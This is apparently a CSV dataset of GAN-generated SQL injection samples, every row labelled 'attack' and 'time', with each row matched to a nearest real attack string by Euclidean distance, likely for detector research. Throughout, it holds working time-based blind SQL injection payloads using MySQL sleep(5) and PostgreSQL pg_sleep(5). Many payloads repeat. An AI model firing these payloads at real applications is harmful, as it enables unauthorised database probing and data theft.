id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
GAN_000176,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  ""gixv""  =  ""gixv",nearest_attack_euclidean,R000680,6.93670769563027
GAN_000177,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,5.428874689731331
GAN_000178,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000087,4.927016217171608
GAN_000179,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000087,4.870323320796991
GAN_000180,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,4.569360994194548
GAN_000181,attack,time,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,nearest_attack_euclidean,R000620,4.459047565702606
GAN_000182,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,5.58929189691055
GAN_000183,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,4.95480790451853
GAN_000184,attack,time,"1""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000379,6.121304449861722
GAN_000185,attack,time,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,nearest_attack_euclidean,R000620,4.725425810193696
GAN_000186,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,5.302388441747342
GAN_000187,attack,time,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and 'bwtk'  =  'bwtk,nearest_attack_euclidean,R000797,5.645616286410006
GAN_000188,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,5.2846498967507625
GAN_000189,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""avyw""  =  ""avyw",nearest_attack_euclidean,R000245,5.6047467687909664
GAN_000190,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,4.555832247108436
GAN_000191,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,4.9220320372026665
GAN_000192,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,4.794217958164653
GAN_000193,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000087,4.424720514321552
GAN_000194,attack,time,1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000405,5.574316021096279
GAN_000195,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""avyw""  =  ""avyw",nearest_attack_euclidean,R000245,5.039433090924199
GAN_000196,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,4.104777803262799
GAN_000197,attack,time,"select sleep  (  5  )   and    (    (     (  ""lczw""  =  ""lczw",nearest_attack_euclidean,R000486,6.4717746957247915
GAN_000198,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,4.712320516669598
GAN_000199,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""avyw""  =  ""avyw",nearest_attack_euclidean,R000245,6.009468614756361
GAN_000200,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,5.145072360012448
GAN_000201,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,6.0622343200770015
GAN_000202,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,4.380114499628801
GAN_000203,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,4.248549432679143
GAN_000204,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""avyw""  =  ""avyw",nearest_attack_euclidean,R000245,5.225372514328662
GAN_000205,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'pgth'  =  'pgth,nearest_attack_euclidean,R000256,5.3685245636842325
GAN_000206,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  ""gixv""  =  ""gixv",nearest_attack_euclidean,R000680,6.91263287068523
GAN_000207,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,4.487954740321396
GAN_000208,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,5.582314397639794
GAN_000209,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,4.547441765577906
GAN_000210,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  ""gixv""  =  ""gixv",nearest_attack_euclidean,R000680,6.307312318286283
GAN_000211,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000087,6.963651969270727
GAN_000212,attack,time,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and 'bwtk'  =  'bwtk,nearest_attack_euclidean,R000797,5.1714400394045485
GAN_000213,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""avyw""  =  ""avyw",nearest_attack_euclidean,R000245,5.848110490942708
GAN_000214,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000087,4.312550373894288
GAN_000215,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,4.405286115400908
GAN_000216,attack,time,"1""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000379,5.918919658489442
GAN_000217,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""avyw""  =  ""avyw",nearest_attack_euclidean,R000245,5.576615995523577
GAN_000218,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R001054,5.173475908429685
GAN_000219,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R001054,6.12493359789277
GAN_000220,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,5.375889911009477
GAN_000221,attack,time,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,nearest_attack_euclidean,R000620,4.618126469364435
GAN_000222,attack,time,"1""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000379,6.358691000462394
GAN_000223,attack,time,1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000405,6.472539788389504
GAN_000224,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,4.904867238445643
GAN_000225,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""avyw""  =  ""avyw",nearest_attack_euclidean,R000245,4.925589026919227
GAN_000226,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,4.222427244175042
GAN_000227,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000087,4.724956875797391
GAN_000228,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R001054,5.272382579415335
GAN_000229,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,4.733620060332555
GAN_000230,attack,time,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and 'bwtk'  =  'bwtk,nearest_attack_euclidean,R000797,6.6900676665336425
GAN_000231,attack,time,"select sleep  (  5  )   and    (    (     (  ""lczw""  =  ""lczw",nearest_attack_euclidean,R000486,5.472260705105147
GAN_000232,attack,time,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and 'bwtk'  =  'bwtk,nearest_attack_euclidean,R000797,6.136494657981048
GAN_000233,attack,time,1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000405,6.020064981382507
GAN_000234,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""avyw""  =  ""avyw",nearest_attack_euclidean,R000245,7.180228620583913
GAN_000235,attack,time,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and 'bwtk'  =  'bwtk,nearest_attack_euclidean,R000797,5.742339827845726
GAN_000236,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,4.44172198124502
GAN_000237,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,5.183311249958714
GAN_000238,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,5.439405209829274
GAN_000239,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""avyw""  =  ""avyw",nearest_attack_euclidean,R000245,5.073116594481795
GAN_000240,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,5.061083039147432
GAN_000241,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,4.934999551853838
GAN_000242,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000087,4.887980169913209
GAN_000243,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""avyw""  =  ""avyw",nearest_attack_euclidean,R000245,5.5029776191945015
GAN_000244,attack,time,1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000405,7.730926343566225
GAN_000245,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,4.632927787938734
GAN_000246,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000087,4.7772302568000296
GAN_000247,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,4.3617927193628
GAN_000248,attack,time,"select sleep  (  5  )   and    (    (     (  ""lczw""  =  ""lczw",nearest_attack_euclidean,R000486,4.983616794208102
GAN_000249,attack,time,1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000405,7.513692182489704
GAN_000250,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000087,4.612059337422049
GAN_000251,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,5.091942640648865
GAN_000252,attack,time,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and 'bwtk'  =  'bwtk,nearest_attack_euclidean,R000797,6.346703033072546
GAN_000253,attack,time,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and 'iwmy'  =  'iwmy,nearest_attack_euclidean,R000749,5.535340704713118
GAN_000254,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,4.370392056171482
GAN_000255,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,5.007139201559533
GAN_000256,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and '%'  =  ',nearest_attack_euclidean,R001010,5.731254643171717
GAN_000257,attack,time,1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000405,6.515964520106507
GAN_000258,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,5.5555501868616926
GAN_000259,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000087,4.669815847190376
GAN_000260,attack,time,1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000405,5.782504691287485
GAN_000261,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,4.31773682975278
GAN_000262,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000087,4.752002057894666
GAN_000263,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,4.91606723203606
GAN_000264,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,5.179548302606687
GAN_000265,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,5.24194223527609
GAN_000266,attack,time,1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000405,5.036795832966281
GAN_000267,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000087,5.45993918978683
GAN_000268,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000087,4.737769731878315
GAN_000269,attack,time,"select sleep  (  5  )   and    (    (     (  ""lczw""  =  ""lczw",nearest_attack_euclidean,R000486,5.439952366963339
GAN_000270,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,4.2644270774040995
GAN_000271,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000087,4.539251198361448
GAN_000272,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,4.503306025937557
GAN_000273,attack,time,1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000405,7.05348281936299
GAN_000274,attack,time,"1""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000379,5.820683849062427
GAN_000275,attack,time,1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000405,7.22513642524914
GAN_000276,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,5.710647070704407
GAN_000277,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R001054,4.993570347143757
GAN_000278,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R001054,5.945038045841404
GAN_000279,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""avyw""  =  ""avyw",nearest_attack_euclidean,R000245,5.095615635765654
GAN_000280,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,4.66072452921551
GAN_000281,attack,time,"1""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000379,6.284369097917778
GAN_000282,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000087,5.3960248728093285
GAN_000283,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,4.620256636025044
GAN_000284,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,4.959575343946713
GAN_000285,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000087,4.9089467361049
GAN_000286,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""avyw""  =  ""avyw",nearest_attack_euclidean,R000245,5.521137531544426
GAN_000287,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,4.1918472665664135
GAN_000288,attack,time,1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000405,6.214593191612046
GAN_000289,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""avyw""  =  ""avyw",nearest_attack_euclidean,R000245,5.402198598376008
GAN_000290,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000087,4.789512459925479
GAN_000291,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,4.8803383041189585
GAN_000292,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,4.671496527713536
GAN_000293,attack,time,select sleep  (  5  )   and    (    (   'uyft'  =  'uyft,nearest_attack_euclidean,R000970,5.062688567614036
GAN_000294,attack,time,1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000405,5.77023241196241
GAN_000295,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,5.287614813606204
GAN_000296,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,4.652418521235199
GAN_000297,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,5.185733104169145
GAN_000298,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,6.524313197482925
GAN_000299,attack,time,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,nearest_attack_euclidean,R000620,3.972964341569801
GAN_000300,attack,time,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,nearest_attack_euclidean,R000620,4.256571135540138
GAN_000301,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000087,4.642689264863938
GAN_000302,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,4.215342260804894
GAN_000303,attack,time,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and 'bwtk'  =  'bwtk,nearest_attack_euclidean,R000797,6.180139945186105
GAN_000304,attack,time,1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000405,8.853836525047315
GAN_000305,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,4.75430721961588
GAN_000306,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,5.005402372460928
GAN_000307,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""avyw""  =  ""avyw",nearest_attack_euclidean,R000245,5.474263095521225
GAN_000308,attack,time,"1""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000379,7.7956365010576265
GAN_000309,attack,time,1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000405,7.185525240781312
GAN_000310,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,5.284231513656457
GAN_000311,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and '%'  =  ',nearest_attack_euclidean,R001010,7.199271111307306
GAN_000312,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R001054,6.052299563678622
GAN_000313,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,4.556138121070099
GAN_000314,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""avyw""  =  ""avyw",nearest_attack_euclidean,R000245,5.224654542033827
GAN_000315,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,4.525124699873834
GAN_000316,attack,time,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and 'bwtk'  =  'bwtk,nearest_attack_euclidean,R000797,5.794902102475392
GAN_000317,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R001054,5.294896411767576
GAN_000318,attack,time,"select sleep  (  5  )   and    (    (     (  ""lczw""  =  ""lczw",nearest_attack_euclidean,R000486,5.113494848755195
GAN_000319,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,4.6751779688366035
GAN_000320,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R001054,4.659005791505384
GAN_000321,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'pgth'  =  'pgth,nearest_attack_euclidean,R000256,5.368783934743459
GAN_000322,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  ""gixv""  =  ""gixv",nearest_attack_euclidean,R000680,8.222062570939274
GAN_000323,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  ""gixv""  =  ""gixv",nearest_attack_euclidean,R000680,6.4987338639709655
GAN_000324,attack,time,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,nearest_attack_euclidean,R000620,4.381766637154871
GAN_000325,attack,time,"1""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000379,5.880335040790349
GAN_000326,attack,time,1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000405,8.176417124367948
GAN_000327,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,5.275352478015829
GAN_000328,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""avyw""  =  ""avyw",nearest_attack_euclidean,R000245,5.36568389774425
GAN_000329,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,5.20987300799775
GAN_000330,attack,time," select sleep  (  5  )   and    (    (   ""wueo""  =  ""wueo",nearest_attack_euclidean,R000534,5.217037736656172
GAN_000331,attack,time,1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000405,6.104867949293739
GAN_000332,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000087,4.4700132949012295
GAN_000333,attack,time,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,nearest_attack_euclidean,R000620,4.400210652527929
GAN_000334,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,4.561935419187109
GAN_000335,attack,time,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and 'bwtk'  =  'bwtk,nearest_attack_euclidean,R000797,5.171069903776213
GAN_000336,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000087,5.107420420124909
GAN_000337,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'pgth'  =  'pgth,nearest_attack_euclidean,R000256,5.597012675465126
GAN_000338,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,4.197086652480245
GAN_000339,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,4.2915565850780935
GAN_000340,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R001054,5.597804470300331
GAN_000341,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,5.0246786916556925
GAN_000342,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,5.234512410972686
GAN_000343,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""avyw""  =  ""avyw",nearest_attack_euclidean,R000245,5.6500112859112255
GAN_000344,attack,time,"1""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000379,8.447754405415484
GAN_000345,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000087,4.371786004116544
GAN_000346,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,4.817521093179925
GAN_000347,attack,time,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and 'bwtk'  =  'bwtk,nearest_attack_euclidean,R000797,5.337274620569973
GAN_000348,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,4.83314259135432
GAN_000349,attack,time,"1""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000379,6.024260183147361
GAN_000350,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  ""gixv""  =  ""gixv",nearest_attack_euclidean,R000680,7.668077160839913
GAN_000351,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,5.204143828543544
